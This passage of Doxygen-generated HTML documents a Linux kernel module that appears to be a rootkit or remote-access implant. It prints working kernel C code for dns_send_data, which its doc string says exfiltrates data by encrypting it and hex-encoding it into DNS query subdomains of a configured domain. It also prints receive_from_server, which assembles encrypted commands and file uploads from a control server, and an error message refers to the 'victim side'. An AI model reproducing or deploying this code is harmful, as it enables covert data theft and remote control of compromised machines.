<div class="line"><span class="lineno">  301</span>        <span class="comment">// Marie Kondo</span></div>
<div class="line"><span class="lineno">  302</span>        kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  303</span>        vfree(decrypted);</div>
<div class="line"><span class="lineno">  304</span>        <span class="keywordflow">return</span> decrypted_len;</div>
<div class="line"><span class="lineno">  305</span>    }</div>
<div class="line"><span class="lineno">  306</span> </div>
<div class="line"><span class="lineno">  307</span>    <span class="comment">// Marie Kondo</span></div>
<div class="line"><span class="lineno">  308</span>    kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  309</span>    <span class="keywordflow">return</span> 0;</div>
<div class="line"><span class="lineno">  310</span>}</div>
<div class="ttc" id="aaes_8c_html_a6bc241684ae62f3134aafe86eb44c2e2"><div class="ttname"><a href="../../dd/d34/aes_8c.html#a6bc241684ae62f3134aafe86eb44c2e2">decrypt_buffer</a></div><div class="ttdeci">int decrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len)</div><div class="ttdoc">Decrypts a buffer using AES-128 in CBC mode.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d34/aes_8c_source.html#l00335">aes.c:335</a></div></div>
<div class="ttc" id="aconfig_8h_html_a62787143a36288db9af243c8bec2aa3b"><div class="ttname"><a href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a></div><div class="ttdeci">#define DNS_DOMAIN</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00048">config.h:48</a></div></div>
<div class="ttc" id="aconfig_8h_html_aa1a62a1468067c7b022a024325225702"><div class="ttname"><a href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a></div><div class="ttdeci">#define DNS_MAX_BUF</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00043">config.h:43</a></div></div>
<div class="ttc" id="aconfig_8h_html_ab45c21ad55157cd53ce4c58d5b7b449f"><div class="ttname"><a href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a></div><div class="ttdeci">#define DNS_HDR_SIZE</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00044">config.h:44</a></div></div>
<div class="ttc" id="adns_8c_html_af4fa4cede0d5ee503bc605138fea7da2"><div class="ttname"><a href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a></div><div class="ttdeci">static int dns_send_query(const char *query_name, __be16 question_type, u8 *response_buffer, int *response_length)</div><div class="ttdoc">Send a single DNS question and receive the raw response.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00035">dns.c:35</a></div></div>
<div class="ttc" id="astructdns__header__t_html"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html">dns_header_t</a></div><div class="ttdoc">DNS protocol header (network byte order, it is important).</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00010">dns.c:10</a></div></div>
<div class="ttc" id="astructdns__header__t_html_acb0a9a6e729d7ba375297cf625fc938b"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">dns_header_t::ancount</a></div><div class="ttdeci">__be16 ancount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00014">dns.c:14</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a1f3fd0d4b58aa92d0cf7a54c4af03671" name="a1f3fd0d4b58aa92d0cf7a54c4af03671"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1f3fd0d4b58aa92d0cf7a54c4af03671">&#9670;&#160;</a></span>dns_send_data()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int dns_send_data </td>
          <td>(</td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>data</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>data_len</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Exfiltrate a data buffer over DNS by hex-chunked A-queries. </p>
<p>Splits <code>data</code> into chunks of <code>DNS_MAX_CHUNK</code> bytes, prefixes each chunk with a "seq/total-" header, hex-encodes, and sends as subdomains. Sleeps briefly between queries to avoid flooding.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>Pointer to data buffer to send. </td></tr>
    <tr><td class="paramname">data_len</td><td>Length of data in bytes. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>0 on success, negative errno on failure. </dd></dl>

<p class="definition">Definition at line <a class="el" href="../../d9/d54/dns_8c_source.html#l00149">149</a> of file <a class="el" href="../../d9/d54/dns_8c_source.html">dns.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  149</span>                                                     {</div>
<div class="line"><span class="lineno">  150</span>    <span class="keywordtype">char</span> *encrypted_msg = NULL;</div>
<div class="line"><span class="lineno">  151</span>    <span class="keywordtype">size_t</span> encrypted_len = 0;</div>
<div class="line"><span class="lineno">  152</span> </div>
<div class="line"><span class="lineno">  153</span>    <span class="comment">// Encrypt the data before sending</span></div>
<div class="line"><span class="lineno">  154</span>    <span class="keywordflow">if</span> (<a class="code hl_function" href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a>(data, data_len, &amp;encrypted_msg, &amp;encrypted_len) &lt; 0)</div>
<div class="line"><span class="lineno">  155</span>        <span class="keywordflow">return</span> -EIO;</div>
<div class="line"><span class="lineno">  156</span> </div>
<div class="line"><span class="lineno">  157</span>    <span class="keywordtype">size_t</span> total_chunks = (encrypted_len + <a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a> - 1) / <a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a>;</div>
<div class="line"><span class="lineno">  158</span> </div>
<div class="line"><span class="lineno">  159</span>    <span class="comment">// Too many chunks, refuse to send, arbitrarily limit to</span></div>
<div class="line"><span class="lineno">  160</span>    <span class="comment">// DNS_MAX_AUTHORIZED_NB_CHUNKS</span></div>
<div class="line"><span class="lineno">  161</span>    <span class="keywordflow">if</span> (total_chunks &gt; <a class="code hl_define" href="../../db/d16/config_8h.html#aeff290013a48f04be86613eae1bd0a42">DNS_MAX_AUTHORIZED_NB_CHUNKS</a>) {</div>
<div class="line"><span class="lineno">  162</span>        vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  163</span>        <a class="code hl_function" href="../../d9/d54/dns_8c.html#a614345530328ddfcd25d37c5d547ca4b">dns_send_data</a>(<span class="stringliteral">&quot;Output on victim side too big. Use TCP instead. &quot;</span>, 47);</div>
<div class="line"><span class="lineno">  164</span>        <span class="keywordflow">return</span> -E2BIG;</div>
<div class="line"><span class="lineno">  165</span>    }</div>
<div class="line"><span class="lineno">  166</span> </div>
<div class="line"><span class="lineno">  167</span>    <span class="keywordtype">size_t</span> chunk_index;</div>
<div class="line"><span class="lineno">  168</span>    <span class="keywordtype">int</span> response_length_local;</div>
<div class="line"><span class="lineno">  169</span>    u8 *response_buffer_local;</div>
<div class="line"><span class="lineno">  170</span> </div>
<div class="line"><span class="lineno">  171</span>    <span class="comment">// Allocate local response buffer</span></div>
<div class="line"><span class="lineno">  172</span>    response_buffer_local = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  173</span>    <span class="keywordflow">if</span> (!response_buffer_local) {</div>
<div class="line"><span class="lineno">  174</span>        vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  175</span>        <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"><span class="lineno">  176</span>    }</div>
<div class="line"><span class="lineno">  177</span> </div>
<div class="line"><span class="lineno">  178</span>    <span class="comment">// Loop over each data chunk</span></div>
<div class="line"><span class="lineno">  179</span>    <span class="keywordflow">for</span> (chunk_index = 0; chunk_index &lt; total_chunks; chunk_index++) {</div>
<div class="line"><span class="lineno">  180</span>        <span class="keywordtype">size_t</span> chunk_size =</div>
<div class="line"><span class="lineno">  181</span>            min(encrypted_len - chunk_index * <a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a>, (<span class="keywordtype">size_t</span>)<a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a>);</div>
<div class="line"><span class="lineno">  182</span>        <span class="keywordtype">char</span> hex_buffer[2 * <a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a> + 1];</div>
<div class="line"><span class="lineno">  183</span>        <span class="keywordtype">char</span> seq_label[80];</div>
<div class="line"><span class="lineno">  184</span>        <span class="keywordtype">char</span> full_qname[200];</div>
<div class="line"><span class="lineno">  185</span>        <span class="keywordtype">size_t</span> i;</div>
<div class="line"><span class="lineno">  186</span> </div>
<div class="line"><span class="lineno">  187</span>        <span class="comment">// Hex-encode the chunk</span></div>
<div class="line"><span class="lineno">  188</span>        <span class="keywordflow">for</span> (i = 0; i &lt; chunk_size; i++)</div>
<div class="line"><span class="lineno">  189</span>            sprintf(hex_buffer + 2 * i, <span class="stringliteral">&quot;%02x&quot;</span>,</div>
<div class="line"><span class="lineno">  190</span>                    encrypted_msg[chunk_index * <a class="code hl_define" href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a> + i]);</div>
<div class="line"><span class="lineno">  191</span>        hex_buffer[2 * chunk_size] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">  192</span> </div>
<div class="line"><span class="lineno">  193</span>        <span class="comment">// Prefix with sequence/total header (not the best way to do it I think, but</span></div>
<div class="line"><span class="lineno">  194</span>        <span class="comment">// works)</span></div>
<div class="line"><span class="lineno">  195</span>        snprintf(seq_label, <span class="keyword">sizeof</span>(seq_label), <span class="stringliteral">&quot;%02zx/%02zx-%s&quot;</span>, chunk_index,</div>
<div class="line"><span class="lineno">  196</span>                 total_chunks, hex_buffer);</div>
<div class="line"><span class="lineno">  197</span> </div>
<div class="line"><span class="lineno">  198</span>        <span class="comment">// Build full QNAME: &quot;seq_label.DNS_DOMAIN&quot;</span></div>
<div class="line"><span class="lineno">  199</span>        snprintf(full_qname, <span class="keyword">sizeof</span>(full_qname), <span class="stringliteral">&quot;%s.%s&quot;</span>, seq_label, <a class="code hl_define" href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a>);</div>
<div class="line"><span class="lineno">  200</span> </div>
<div class="line"><span class="lineno">  201</span>        <span class="comment">// Send the A-query carrying this chunk over DNS</span></div>
<div class="line"><span class="lineno">  202</span>        <a class="code hl_function" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a>(full_qname, htons(1), response_buffer_local,</div>
<div class="line"><span class="lineno">  203</span>                       &amp;response_length_local);</div>
<div class="line"><span class="lineno">  204</span> </div>
<div class="line"><span class="lineno">  205</span>        <span class="comment">// Craque le sleep</span></div>
<div class="line"><span class="lineno">  206</span>        msleep(10);</div>
<div class="line"><span class="lineno">  207</span>    }</div>
<div class="line"><span class="lineno">  208</span> </div>
<div class="line"><span class="lineno">  209</span>    <span class="comment">// Marie Kondo</span></div>
<div class="line"><span class="lineno">  210</span>    vfree(encrypted_msg);</div>
<div class="line"><span class="lineno">  211</span>    kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  212</span>    <span class="keywordflow">return</span> 0;</div>
<div class="line"><span class="lineno">  213</span>}</div>
<div class="ttc" id="aaes_8c_html_a3e5d8f107c3453c7e498e162026f2dac"><div class="ttname"><a href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a></div><div class="ttdeci">int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len)</div><div class="ttdoc">Encrypts a buffer using AES-128 in CBC mode.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d34/aes_8c_source.html#l00322">aes.c:322</a></div></div>
<div class="ttc" id="aconfig_8h_html_a4f447ed06a449a91a2ca14f2d6df4b2b"><div class="ttname"><a href="../../db/d16/config_8h.html#a4f447ed06a449a91a2ca14f2d6df4b2b">DNS_MAX_CHUNK</a></div><div class="ttdeci">#define DNS_MAX_CHUNK</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00045">config.h:45</a></div></div>
<div class="ttc" id="aconfig_8h_html_aeff290013a48f04be86613eae1bd0a42"><div class="ttname"><a href="../../db/d16/config_8h.html#aeff290013a48f04be86613eae1bd0a42">DNS_MAX_AUTHORIZED_NB_CHUNKS</a></div><div class="ttdeci">#define DNS_MAX_AUTHORIZED_NB_CHUNKS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00046">config.h:46</a></div></div>
<div class="ttc" id="adns_8c_html_a614345530328ddfcd25d37c5d547ca4b"><div class="ttname"><a href="../../d9/d54/dns_8c.html#a614345530328ddfcd25d37c5d547ca4b">dns_send_data</a></div><div class="ttdeci">int dns_send_data(const char *data, size_t data_len)</div><div class="ttdoc">Exfiltrate a data buffer over DNS by hex-chunked A-queries.</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00149">dns.c:149</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a6e4500656cc3e4933c0d6dc0507f0696" name="a6e4500656cc3e4933c0d6dc0507f0696"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6e4500656cc3e4933c0d6dc0507f0696">&#9670;&#160;</a></span>get_worker_socket()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">struct socket * get_worker_socket </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/df8/socket_8c_source.html#l00017">17</a> of file <a class="el" href="../../d5/df8/socket_8c_source.html">socket.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   17</span>                                       {</div>
<div class="line"><span class="lineno">   18</span>    <span class="keyword">struct </span>socket *s;</div>
<div class="line"><span class="lineno">   19</span>    mutex_lock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   20</span>    s = <a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>;</div>
<div class="line"><span class="lineno">   21</span>    mutex_unlock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   22</span>    <span class="keywordflow">return</span> s;</div>
<div class="line"><span class="lineno">   23</span>}</div>
</div><!-- fragment -->
</div>
</div>
<a id="af3cb573e06b73626a72c113f34ec7340" name="af3cb573e06b73626a72c113f34ec7340"></a>
<h2 class="memtitle"><span class="permalink"><a href="#af3cb573e06b73626a72c113f34ec7340">&#9670;&#160;</a></span>is_user_auth()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">bool is_user_auth </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>is_user_auth - Check if the user is authenticated. Return: true if the user is authenticated, false otherwise. </p>

<p class="definition">Definition at line <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html#l00013">13</a> of file <a class="el" href="../../d4/d33/tcp_2worker_8c_source.html">tcp/worker.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   13</span>                        {</div>
<div class="line"><span class="lineno">   14</span>    <span class="keywordflow">return</span> <a class="code hl_variable" href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a>;</div>
<div class="line"><span class="lineno">   15</span>}</div>
<div class="ttc" id="atcp_2worker_8c_html_a9701dcc09cacdca5f5952a4dfc91b2e0"><div class="ttname"><a href="../../d4/d33/tcp_2worker_8c.html#a9701dcc09cacdca5f5952a4dfc91b2e0">is_auth</a></div><div class="ttdeci">static bool is_auth</div><div class="ttdef"><b>Definition</b> <a href="../../d4/d33/tcp_2worker_8c_source.html#l00006">tcp/worker.c:6</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="ab8398f09feb91fd48c40520303c273b1" name="ab8398f09feb91fd48c40520303c273b1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ab8398f09feb91fd48c40520303c273b1">&#9670;&#160;</a></span>receive_from_server()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int receive_from_server </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>buffer</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>max_len</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>receive_from_server - Receives a message from the server, decrypts it, and processes it. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">buffer</td><td>The buffer to store the received message. </td></tr>
    <tr><td class="paramname">max_len</td><td>The maximum length of the buffer.</td></tr>
  </table>
  </dd>
</dl>
<p>This function reads chunks from the server, assembles them, decrypts the complete message, and returns it in the provided buffer. It handles both text commands and file uploads.</p>
<p>Return: The length of the received message on success, negative error code on failure. </p>

<p class="definition">Definition at line <a class="el" href="../../d6/d6e/network_8c_source.html#l00200">200</a> of file <a class="el" href="../../d6/d6e/network_8c_source.html">network.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  200</span>                                                      {</div>
<div class="line"><span class="lineno">  201</span>    <span class="keyword">struct </span>socket *sock = <a class="code hl_function" href="../../da/d32/cmd_8c.html#a6e4500656cc3e4933c0d6dc0507f0696">get_worker_socket</a>();</div>
<div class="line"><span class="lineno">  202</span>    <span class="keywordflow">if</span> (!sock)</div>
<div class="line"><span class="lineno">  203</span>        <span class="keywordflow">return</span> -EINVAL;</div>
<div class="line"><span class="lineno">  204</span> </div>
<div class="line"><span class="lineno">  205</span>    <span class="comment">// Const of the frame</span></div>
<div class="line"><span class="lineno">  206</span>    <span class="keyword">const</span> <span class="keywordtype">size_t</span> FRAME_SIZE_FULL = <a class="code hl_define" href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a>;</div>
<div class="line"><span class="lineno">  207</span>    <span class="keyword">const</span> <span class="keywordtype">size_t</span> HEADER_SIZE = 10;</div>
<div class="line"><span class="lineno">  208</span>    <span class="keyword">const</span> <span class="keywordtype">size_t</span> EOT_SIZE = 1;</div>
<div class="line"><span class="lineno">  209</span>    <span class="keyword">const</span> <span class="keywordtype">size_t</span> BODY_SIZE = FRAME_SIZE_FULL - HEADER_SIZE - EOT_SIZE;</div>
<div class="line"><span class="lineno">  210</span> </div>
<div class="line"><span class="lineno">  211</span>    <span class="comment">// Statically sized temp buffers</span></div>
<div class="line"><span class="lineno">  212</span>    <span class="keywordtype">char</span> header_buffer[10];</div>
<div class="line"><span class="lineno">  213</span>    <span class="keywordtype">char</span> *payloadbuf = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#ace1d139b840ca4186a2886360666dfcd">STD_BUFFER_SIZE</a>, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  214</span>    <span class="keywordflow">if</span> (!payloadbuf) {</div>
<div class="line"><span class="lineno">  215</span>        <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"><span class="lineno">  216</span>    }</div>
<div class="line"><span class="lineno">  217</span>    <span class="keywordtype">char</span> padbuf[10];</div>
<div class="line"><span class="lineno">  218</span> </div>
<div class="line"><span class="lineno">  219</span>    <span class="keywordtype">char</span> *received = NULL;</div>
<div class="line"><span class="lineno">  220</span>    <span class="keywordtype">bool</span> *seen = NULL;</div>
<div class="line"><span class="lineno">  221</span>    <span class="keywordtype">size_t</span> nb_chunks = 0;</div>
<div class="line"><span class="lineno">  222</span>    <span class="keywordtype">size_t</span> total_received = 0;</div>
<div class="line"><span class="lineno">  223</span>    <span class="keywordtype">int</span> ret = -EIO;</div>
<div class="line"><span class="lineno">  224</span> </div>
<div class="line"><span class="lineno">  225</span>    <span class="comment">// Read and assemble all chunks (please pray god)</span></div>
<div class="line"><span class="lineno">  226</span>    <span class="keywordflow">while</span> (<span class="keyword">true</span>) {</div>
<div class="line"><span class="lineno">  227</span>        <span class="keywordtype">int</span> off, n;</div>
<div class="line"><span class="lineno">  228</span>        uint32_t total, index;</div>
<div class="line"><span class="lineno">  229</span>        uint16_t data_len;</div>
<div class="line"><span class="lineno">  230</span> </div>
<div class="line"><span class="lineno">  231</span>        <span class="comment">// Read exactly the size of header in bytes</span></div>
<div class="line"><span class="lineno">  232</span>        off = 0;</div>
<div class="line"><span class="lineno">  233</span>        <span class="keywordflow">while</span> (off &lt; HEADER_SIZE) {</div>
<div class="line"><span class="lineno">  234</span>            <span class="keyword">struct </span>kvec vec = { .iov_base = header_buffer + off,</div>
<div class="line"><span class="lineno">  235</span>                                .iov_len = HEADER_SIZE - off };</div>
<div class="line"><span class="lineno">  236</span>            <span class="keyword">struct </span>msghdr msg = { 0 };</div>
<div class="line"><span class="lineno">  237</span>            n = kernel_recvmsg(sock, &amp;msg, &amp;vec, 1, vec.iov_len, 0);</div>
<div class="line"><span class="lineno">  238</span>            <span class="keywordflow">if</span> (n &lt;= 0) {</div>
<div class="line"><span class="lineno">  239</span>                ret = -EIO;</div>
<div class="line"><span class="lineno">  240</span>                <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  241</span>            }</div>
<div class="line"><span class="lineno">  242</span> </div>
<div class="line"><span class="lineno">  243</span>            off += n;</div>
<div class="line"><span class="lineno">  244</span>        }</div>
<div class="line"><span class="lineno">  245</span> </div>
<div class="line"><span class="lineno">  246</span>        <span class="comment">// Parse the fucking big endian fields</span></div>
<div class="line"><span class="lineno">  247</span>        total = be32_to_cpu(*(__be32 *)(header_buffer + 0));</div>
<div class="line"><span class="lineno">  248</span>        index = be32_to_cpu(*(__be32 *)(header_buffer + 4));</div>
<div class="line"><span class="lineno">  249</span>        data_len = be16_to_cpu(*(__be16 *)(header_buffer + 8));</div>
<div class="line"><span class="lineno">  250</span>        <span class="keywordflow">if</span> (data_len &gt; BODY_SIZE) {</div>
<div class="line"><span class="lineno">  251</span>            ret = -EINVAL;</div>
<div class="line"><span class="lineno">  252</span>            <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  253</span>        }</div>
<div class="line"><span class="lineno">  254</span> </div>
<div class="line"><span class="lineno">  255</span>        <span class="comment">// Read payload and the EOT</span></div>
<div class="line"><span class="lineno">  256</span>        off = 0;</div>
<div class="line"><span class="lineno">  257</span>        <span class="keywordflow">while</span> (off &lt; (<span class="keywordtype">int</span>)(data_len + EOT_SIZE)) {</div>
<div class="line"><span class="lineno">  258</span>            <span class="keyword">struct </span>kvec vec = { .iov_base = payloadbuf + off,</div>
<div class="line"><span class="lineno">  259</span>                                .iov_len = (data_len + EOT_SIZE) - off };</div>
<div class="line"><span class="lineno">  260</span>            <span class="keyword">struct </span>msghdr msg = { 0 };</div>
<div class="line"><span class="lineno">  261</span>            n = kernel_recvmsg(sock, &amp;msg, &amp;vec, 1, vec.iov_len, 0);</div>
<div class="line"><span class="lineno">  262</span>            <span class="keywordflow">if</span> (n &lt;= 0) {</div>
<div class="line"><span class="lineno">  263</span>                ret = -EIO;</div>
<div class="line"><span class="lineno">  264</span>                <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  265</span>            }</div>
<div class="line"><span class="lineno">  266</span>            off += n;</div>
<div class="line"><span class="lineno">  267</span>        }</div>
<div class="line"><span class="lineno">  268</span> </div>
<div class="line"><span class="lineno">  269</span>        <span class="keywordflow">if</span> ((uint8_t)payloadbuf[data_len] != <a class="code hl_define" href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a>) {</div>
<div class="line"><span class="lineno">  270</span>            ret = -EINVAL;</div>
<div class="line"><span class="lineno">  271</span>            <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  272</span>        }</div>
<div class="line"><span class="lineno">  273</span> </div>
<div class="line"><span class="lineno">  274</span>        <span class="comment">// Discard remaining padding up to FRAME_SIZE_FULL</span></div>
<div class="line"><span class="lineno">  275</span>        <span class="keywordtype">size_t</span> pad = FRAME_SIZE_FULL - (HEADER_SIZE + data_len + EOT_SIZE);</div>
<div class="line"><span class="lineno">  276</span>        <span class="keywordflow">while</span> (pad &gt; 0) {</div>
<div class="line"><span class="lineno">  277</span>            <span class="keywordtype">size_t</span> rd = pad &gt; HEADER_SIZE ? HEADER_SIZE : pad;</div>
<div class="line"><span class="lineno">  278</span>            <span class="keyword">struct </span>kvec vec = { .iov_base = padbuf, .iov_len = rd };</div>
<div class="line"><span class="lineno">  279</span>            <span class="keyword">struct </span>msghdr msg = { 0 };</div>
<div class="line"><span class="lineno">  280</span>            n = kernel_recvmsg(sock, &amp;msg, &amp;vec, 1, rd, 0);</div>
<div class="line"><span class="lineno">  281</span>            <span class="keywordflow">if</span> (n &lt;= 0) {</div>
<div class="line"><span class="lineno">  282</span>                ret = -EIO;</div>
<div class="line"><span class="lineno">  283</span>                <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  284</span>            }</div>
<div class="line"><span class="lineno">  285</span>            pad -= n;</div>
<div class="line"><span class="lineno">  286</span>        }</div>
<div class="line"><span class="lineno">  287</span> </div>
<div class="line"><span class="lineno">  288</span>        <span class="comment">// DEBUG</span></div>
<div class="line"><span class="lineno">  289</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;CHUNK %u/%u len=%u&quot;</span>, index, total, data_len);</div>
<div class="line"><span class="lineno">  290</span> </div>
<div class="line"><span class="lineno">  291</span>        <span class="comment">// On first real chunk, allocate the big buffer and the bool buffer</span></div>
<div class="line"><span class="lineno">  292</span>        <span class="keywordflow">if</span> (!received) {</div>
<div class="line"><span class="lineno">  293</span>            nb_chunks = total;</div>
<div class="line"><span class="lineno">  294</span>            received = vmalloc(nb_chunks * BODY_SIZE);</div>
<div class="line"><span class="lineno">  295</span>            seen = kzalloc(nb_chunks * <span class="keyword">sizeof</span>(<span class="keywordtype">bool</span>), GFP_KERNEL);</div>
<div class="line"><span class="lineno">  296</span>            <span class="keywordflow">if</span> (!received || !seen) {</div>
<div class="line"><span class="lineno">  297</span>                ret = -ENOMEM;</div>
<div class="line"><span class="lineno">  298</span>                <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  299</span>            }</div>
<div class="line"><span class="lineno">  300</span>        }</div>
<div class="line"><span class="lineno">  301</span> </div>
<div class="line"><span class="lineno">  302</span>        <span class="comment">// Check the problems</span></div>
<div class="line"><span class="lineno">  303</span>        <span class="keywordflow">if</span> (total != nb_chunks || index &gt;= nb_chunks) {</div>
<div class="line"><span class="lineno">  304</span>            ret = -EINVAL;</div>
<div class="line"><span class="lineno">  305</span>            <span class="keywordflow">goto</span> cleanup;</div>
<div class="line"><span class="lineno">  306</span>        }</div>
<div class="line"><span class="lineno">  307</span> </div>
<div class="line"><span class="lineno">  308</span>        <span class="keywordflow">if</span> (!seen[index]) {</div>
<div class="line"><span class="lineno">  309</span>            memcpy(received + index * BODY_SIZE, payloadbuf, data_len);</div>
<div class="line"><span class="lineno">  310</span>            seen[index] = <span class="keyword">true</span>;</div>
<div class="line"><span class="lineno">  311</span>            total_received += data_len;</div>
<div class="line"><span class="lineno">  312</span>        }</div>
<div class="line"><span class="lineno">  313</span> </div>
<div class="line"><span class="lineno">  314</span>        <span class="comment">// Exit once we have every chunk (maybe should add a timeout)</span></div>
<div class="line"><span class="lineno">  315</span>        <span class="keywordflow">if</span> (<a class="code hl_function" href="../../d6/d6e/network_8c.html#a882a4da02deaef0da1da02f794925cb8">all_chunks_received</a>(seen, nb_chunks))</div>
<div class="line"><span class="lineno">  316</span>            <span class="keywordflow">break</span>;</div>
<div class="line"><span class="lineno">  317</span>    }</div>
<div class="line"><span class="lineno">  318</span> </div>
<div class="line"><span class="lineno">  319</span>    kfree(seen);</div>
<div class="line"><span class="lineno">  320</span>    seen = NULL;</div>
<div class="line"><span class="lineno">  321</span> </div>
<div class="line"><span class="lineno">  322</span>    <span class="comment">// Decrypt and dispatch</span></div>
<div class="line"><span class="lineno">  323</span>    <span class="keywordtype">char</span> *decrypted = NULL;</div>
<div class="line"><span class="lineno">  324</span>    <span class="keywordtype">size_t</span> dlen = 0;</div>
<div class="line"><span class="lineno">  325</span> </div>
<div class="line"><span class="lineno">  326</span>    ret = <a class="code hl_function" href="../../dd/d34/aes_8c.html#a6bc241684ae62f3134aafe86eb44c2e2">decrypt_buffer</a>(received, total_received, &amp;decrypted, &amp;dlen);</div>
<div class="line"><span class="lineno">  327</span>    vfree(received);</div>
<div class="line"><span class="lineno">  328</span>    received = NULL;</div>
